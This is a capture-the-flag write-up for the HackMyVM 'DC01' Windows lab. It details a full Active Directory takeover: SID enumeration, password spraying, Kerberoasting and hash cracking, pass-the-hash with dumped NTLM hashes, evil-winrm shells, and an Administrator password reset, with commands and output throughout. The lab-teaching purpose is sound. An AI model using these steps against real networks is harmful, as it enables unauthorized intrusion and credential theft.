# 🖥️ Writeup - DC01 

**Platform:** HackMyVM  
**Difficulty:** Easy  
**Operating System:** Windows  

# INSTALLATION

We download the `zip` containing the `.ova` of the DC01 machine, extract it, and import it into VirtualBox.

We configure the network interface of the DC01 machine and run it alongside the attacker machine.

# HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to DC01, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:ac:34:13      1      60  PCS Systemtechnik GmbH      
 10.0.4.17       08:00:27:0d:69:c5      1      60  PCS Systemtechnik GmbH
 ```

 We identify with high confidence that the victim’s IP is `10.0.4.17`.

 # PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.17
``` 

```bash
nmap -n -Pn -sCV -p88,389,445 --min-rate 5000 10.0.4.17
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 14:08 CEST
Nmap scan report for 10.0.4.17
Host is up (0.00015s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-05 21:09:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49719/tcp open  msrpc         Microsoft Windows RPC
49778/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:0D:69:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.29 seconds
```
It is clear that we are dealing with an `Active Directory` environment, and the domain is `SOUPEDECODE.LOCAL`.

We then add the domain to the `/etc/hosts` file.

Info:
```
127.0.0.1	localhost
127.0.1.1	kali
10.0.4.17       SOUPEDECODE.LOCAL
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

# SMB
Now we proceed with SMB enumeration to look for information about available shares and users:

```bash
smbclient -L SOUPEDECODE.LOCAL -N
```
Info:
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to SOUPEDECODE.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
We can enumerate the shares through a NULL session, which gives us a significant advantage. However, we also check whether the guest user works.

```bash
netexec smb SOUPEDECODE.LOCAL -u 'guest' -p ''  --shares
```

Info:
```
SMB         10.0.4.17       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.17       445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.0.4.17       445    DC01             [*] Enumerated shares
SMB         10.0.4.17       445    DC01             Share           Permissions     Remark
SMB         10.0.4.17       445    DC01             -----           -----------     ------
SMB         10.0.4.17       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.4.17       445    DC01             backup                          
SMB         10.0.4.17       445    DC01             C$                              Default share
SMB         10.0.4.17       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.4.17       445    DC01             NETLOGON                        Logon server share 
SMB         10.0.4.17       445    DC01             SYSVOL                          Logon server share 
SMB         10.0.4.17       445    DC01             Users
```

Using both the NULL session and the enabled guest account, we are able to view the shares and identify two interesting ones: `backup` and `Users`, although we do not have permissions on them.

# Impacket lookupsid
Since we can enumerate using a NULL session, we run Impacket’s lookupsid.py to obtain a list of system users.

```bash
impacket-lookupsid SOUPEDECODE.LOCAL/anonymous@10.0.4.17 > user.txt
```
Info:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at SOUPEDECODE.LOCAL
[*] StringBinding ncacn_np:SOUPEDECODE.LOCAL[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
525: SOUPEDECODE\Protected Users (SidTypeGroup)
526: SOUPEDECODE\Key Admins (SidTypeGroup)
527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
1000: SOUPEDECODE\DC01$ (SidTypeUser)
1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
1103: SOUPEDECODE\bmark0 (SidTypeUser)
1104: SOUPEDECODE\otara1 (SidTypeUser)
1105: SOUPEDECODE\kleo2 (SidTypeUser)
1106: SOUPEDECODE\eyara3 (SidTypeUser)
1107: SOUPEDECODE\pquinn4 (SidTypeUser)
1108: SOUPEDECODE\jharper5 (SidTypeUser)
1109: SOUPEDECODE\bxenia6 (SidTypeUser)
1110: SOUPEDECODE\gmona7 (SidTypeUser)
1111: SOUPEDECODE\oaaron8 (SidTypeUser)
1112: SOUPEDECODE\pleo9 (SidTypeUser)
1113: SOUPEDECODE\evictor10 (SidTypeUser)
1114: SOUPEDECODE\wreed11 (SidTypeUser)
1115: SOUPEDECODE\bgavin12 (SidTypeUser)
1116: SOUPEDECODE\ndelia13 (SidTypeUser)
1117: SOUPEDECODE\akevin14 (SidTypeUser)
1118: SOUPEDECODE\kxenia15 (SidTypeUser)
1119: SOUPEDECODE\ycody16 (SidTypeUser)
1120: SOUPEDECODE\qnora17 (SidTypeUser)
1121: SOUPEDECODE\dyvonne18 (SidTypeUser)
1122: SOUPEDECODE\qxenia19 (SidTypeUser)
..................<REST_OF_USERS>.........................................
```


The list must be processed to extract only the usernames.

```bash
grep '(SidTypeUser)' user.txt | awk -F'\\\\' '{print $2}' | cut -d' ' -f1 > users.txt
```
Info:
```
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
bxenia6
gmona7
oaaron8
pleo9
evictor10
wreed11
bgavin12
ndelia13
akevin14
kxenia15
ycody16
qnora17
dyvonne18
qxenia19
rreed20
icody21
ftom22
ijake23
rpenny24
jiris25
colivia26
pyvonne27
zfrank28
ybob317
file_svc
charlie
qethan32
khenry33
sjudy34
rrachel35
caiden36
xbella37
smark38
zximena448
fmike40
yeli41
knina42
..................<REST_OF_USERS>.........................................
```
# PASSWORD SPRAYING
Let's perform password spraying against these accounts.
```bash
crackmapexec smb 10.0.4.17 -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

Info:
```
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```
We successfully find credentials for `ybob317` : `ybob317`.

# SMB with user ybob317

```bash
smbclient -L //SOUPEDECODE.LOCAL/ -U ybob317
```
Info:
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to SOUPEDECODE.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
We then attempt to access the `Users` share:

```bash
smbclient //SOUPEDECODE.LOCAL/Users -U ybob317
```
Info:
```
  .                                  DR        0  Mon Sep  8 00:11:15 2025
  ..                                DHS        0  Sun Sep  7 23:59:43 2025
  admin                               D        0  Fri Jul  5 00:49:01 2024
  Administrator                       D        0  Sat Jun 15 21:56:40 2024
  All Users                       DHSrn        0  Sat May  8 10:26:16 2021
  Default                           DHR        0  Sun Jun 16 04:51:08 2024
  Default User                    DHSrn        0  Sat May  8 10:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 10:14:03 2021
  FileServer$                         D        0  Mon Sep  8 00:11:15 2025
  Public                             DR        0  Sat Jun 15 19:54:32 2024
  ybob317
```
This share maps to the Windows directory `C:\Users`. Inside the folder of `ybob317` we find the user flag in the `user.txt` file.

```
6bab1f09a7403980bfeb4c2b412be47b
```

This does not help us move forward. 
Now that we have valid credentials, we proceed to test additional attack paths such as a Kerberoasting attack.


# KERBEROASTING ATTACK
```bash
impacket-GetUserSPNs -request -dc-ip 10.0.4.17 SOUPEDECODE.LOCAL/ybob317:ybob317
```
Info:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>               


[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

No hashes appear at first, but this may be due to the “Clock skew too great” error, which is quite common.

We fix this issue with the following command:
```bash
sudo rdate -n 10.0.4.17
```

After retrying, we successfully obtain `hashes` for each of the services. We store all of them in a file named `hassh.txt`, ready to attempt cracking.

# HASH CRACKING

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt  hassh.txt
```
Info:
```
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)     
1g 0:00:00:31 92.26% (ETA: 15:47:59) 0.03155g/s 419972p/s 2018Kc/s 2018KC/s 128268..12800151
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

We manage to recover one plaintext password from these hashes, but we do not initially know which account it belongs to.
To identify the correct user, we run password spraying again.

```bash
crackmapexec smb 10.0.4.17 -u userss.txt -p 'Password123!!' --continue-on-success --no-bruteforce
```

Info:
```
SMB         10.0.4.17       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.17       445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\firewall_svc:Password123!! STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\backup_svc:Password123!! STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\web_svc:Password123!! STATUS_LOGON_FAILURE 
SMB         10.0.4.17       445    DC01             [-] SOUPEDECODE.LOCAL\monitoring_svc:Password123!! STATUS_LOGON_FAILURE
```

This confirms the plaintext credentials for user file_svc.
Next, we check whether the `file_svc` account can access the SMB share `backup`.

# SMB with user file_svc

```bash
smbclient \\\\10.0.4.17\\backup -U 'file_svc' -p
```
Info:
```
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 19:41:17 2024
  ..                                 DR        0  Mon Jun 17 19:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 10:41:05 2024

		12942591 blocks of size 4096. 10771796 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (79.2 KiloBytes/sec) (average 79.2 KiloBytes/sec)
```
Inside the `backup` share we find a `.txt` file, which we copy to our attacker machine for further inspection.

Info:
```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

The file backup_extract.txt contains what appear to be hashes of users and services.

One entry that stands out is the account `FileServer$`, since we previously discovered it through its `TGT`. We test whether its `hash` can be used as a password against the `SMB` service, and confirm that it works.

```bash
crackmapexec smb 10.0.4.17 -u FileServer$ -H 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' --shares
```
Info:
```
SMB         10.0.4.17       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.17       445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.0.4.17       445    DC01             [+] Enumerated shares
SMB         10.0.4.17       445    DC01             Share           Permissions     Remark
SMB         10.0.4.17       445    DC01             -----           -----------     ------
SMB         10.0.4.17       445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.4.17       445    DC01             backup                          
SMB         10.0.4.17       445    DC01             C$              READ,WRITE      Default share
SMB         10.0.4.17       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.4.17       445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.0.4.17       445    DC01             SYSVOL          READ            Logon server share 
SMB         10.0.4.17       445    DC01             Users
```

Given this result, we proceed to test if the same credentials also allow us to authenticate over `WinRM`.

# WINRM

```bash 
netexec winrm SOUPEDECODE.LOCAL -u FileServer$ -p 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559'
```
Info:
```
WINRM       10.0.4.17       5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.0.4.17       5985   DC01             [+] SOUPEDECODE.LOCAL\FileServer$:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

We confirm that we can authenticate over `WinRM` as the `FileServer$` user and gain system access.

```bash
evil-winrm -i SOUPEDECODE.LOCAL -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
```
Info:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FileServer$\Documents>
```

We begin searching through the files of both `FileServer$` and the other users, looking for anything of interest. In the path `C:\Users\Administrator\Desktop` we find the root flag of the machine.

```
a9564ebc3289b7a14551baf8ad5ec60a
```

However, this is not the end, we still need to escalate privileges.

# PRIVILEGE ESCALATION

```powershell
whoami /priv
```

Info:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

The following line is particularly relevant:

```
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

But before attempting anything, we perform additional enumeration, such as checking the groups that the `FileServer$` user belongs to.

```powershell
whoami /groups
```

Info:
```
GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

We discover that the account is part of the `BUILTIN\Administrators` group. This means we can directly change the password of the `Administrator` account, although in a real world environment this would not be considered good practice.

```powershell
net user Administrator 123456!
```

Info:
```
The command completed successfully.
```
With the new credentials, we log into `WinRM` as `Administrator`. 

```bash
evil-winrm -i SOUPEDECODE.LOCAL -u 'Administrator' -p '123456!'
```

Info:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
We now have `Administrator` level access!